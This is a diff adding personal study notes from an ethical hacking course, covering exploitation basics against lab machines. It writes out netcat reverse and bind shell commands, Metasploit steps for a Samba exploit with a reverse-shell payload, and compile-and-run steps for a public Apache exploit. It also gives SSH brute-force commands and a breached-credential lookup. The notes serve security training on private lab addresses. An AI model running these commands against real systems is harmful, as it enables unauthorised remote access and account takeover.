@@ -1,3 +1,4 @@
+
 # Practical Ethical Hacking - The Complete Course
 
 
@@ -1470,6 +1471,11 @@ for shoes in [high, medium, low]:
 
 ![[Pasted image 20221226203834.png]]
 
+> [!attention] 
+> It didn't work as they showed in Video. But this here is working for me:
+> `ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedKeyTypes=+ssh-rsa  -oKexAlgorithms=+diffie-hellman-group1-sha1 -c aes128-cbc  172.16.215.128
+` 
+
 
 ### Researching Potential Vulnerabilities
 
@@ -1538,5 +1544,167 @@ for shoes in [high, medium, low]:
 
 ## Exploitation Basics
 
+
 ### Reverse Shells vs Bind Shells
+
+![[Pasted image 20221227104723.png]]
+![[Pasted image 20221227105144.png]]
+
+
+> [!note] 
+> **Reverse Shell:**
+> Open Netcat listener:
+> `nc -nvlp 4444`
+> Connect to listener:
+>  `nc 192.168.2.133 4444 -e /bin/bash`
+
+> [!note] 
+> **Bind Shell:** 
+> On victim:
+> `nc -nvlp 4444 -e /bin/bash`
+> On attacker:
+> `nc 192.168.2.133 4444`
+
+
+### Staged vs Non-Staged Payloads
+
+![[Pasted image 20221227110739.png]]
+
+> [!caution] 
+> If exploit isn't working, try other type of payload! 
+
+
+### Gaining Root with Metasploit
+
+> [!todo] 
+>  `searchsploit samba 2.2 `
+>  `msfconsole`
+>  `search trans2open`
+>  `use 1`
+>  `show options`
+>  `set rhost  172.16.215.1`
+>  `run`
+>  Isn't working. We have to change payload
+>  `set payload linux/x86/`
+>  `set payload linux/x86/shell_reverse_tcp`
+>  `show options`
+>  `run` or `exploiot`
+
+
+![[Pasted image 20221227111500.png]]
+![[Pasted image 20221227111621.png]]
+
+![[Pasted image 20221227112420.png]]
+![[Pasted image 20221227112720.png]]
+![[Pasted image 20221227113010.png]]
+
+
+### Manual Exploitation
+
+> [!note] 
+> Google OpenLuck:
+> https://github.com/heltonWernik/OpenLuck
+> 
+
+> [!todo] 
+> `git clone https://github.com/heltonWernik/OpenFuck.git` 
+> `apt-get install libssl-dev`
+> `cd OpenFuck`
+> `gcc -o OpenFuck OpenFuck.c -lcrypto`
+> `./open 0x6a 192.168.80.145 443 -c 40`
+> `./open 0x6b 172.16.215.128 -c 40`
+
+![[Pasted image 20221227132312.png]]
+
+
+### Brute Force Attacks
+
+
+> [!todo] 
+> Hydra Brute Force SSH:
+> `hydra -l root -P /usr/share/wordlists/metasploit/unix_passwords.txt ssh://172.16.215.128:22 -t 4 -V
+` 
+
+> [!attention] 
+> Hydra didn't work with this SSH Server. In Video it's working.  
+
+> [!todo] 
+>  SSH Burte Force SSH via Metasploit
+>  `msfconsole`
+>  `search ssh`
+>  `use auxiliary/scanner/ssh/ssh_login`
+>  `show options`
+>  `set username root`
+>  `set pass_file /usr/share/wordlists/metasploit/unix_passwords.txt`
+>  `set rhost 172.16.215.128`
+>  `set threads 10`
+>  `set verbose true`
+>`run`
+
+![[Pasted image 20221227145327.png]]
+
+
+### Credential Stuffing and Password Spraying
+
+![[Pasted image 20221227145849.png]]
+
+> [!tip] 
+> Install FoxyProxy in Firefox or Chrome:
+> https://addons.mozilla.org/en-GB/firefox/addon/foxyproxy-standard/
+> 
+
+> [!todo] 
+> Get breached credentials:
+> `breach-parse tessla.com tessla.txt`
+
+![[Pasted image 20221227151810.png]]
+![[Pasted image 20221227151854.png]]
+![[Pasted image 20221227152001.png]]
+![[Pasted image 20221227152157.png]]
+![[Pasted image 20221227152242.png]]
+![[Pasted image 20221227152324.png]]
+
+
+### Our Notes, Revisited
+
+![[Pasted image 20221227163027.png]]
+![[Pasted image 20221227163231.png]]
+
+
+## New Capstone
+
+> [!info] 
+> Old PEH Capstone VMs:
+> https://drive.google.com/drive/folders/1VXEuyySgzsSo-MYmyCareTnJ5rAeVKeH
+> DEV VM:
+> https://cdn.fs.teachablecdn.com/XyWGk3BwRMWhth526GV0
+> Old Capstone Videos:
+> https://www.youtube.com/watch?v=JZN3JhoAdWo&list=PLLKT__MCUeiyxF54dBIkzEXT7h8NgqQUB&ab_channel=TheCyberMentor
+> 
+
+
+![[Pasted image 20221227164253.png]]
+
+
+### Set Up - Blue
+
+> [!info] 
+> 2GB Ram is enouth
+> Set NAT Network Settings
+> 
+
+> [!faq] 
+> User: user
+> Password: Password123!
+> -----------------
+> User: administrator
+> Password: Password456!
+
+**US Keyboard:**
+![[Pasted image 20221227165418.png]]
+
+
+### Walkthrough - Blue
+
+![[Blue_Report.ctd.pdf]]
 
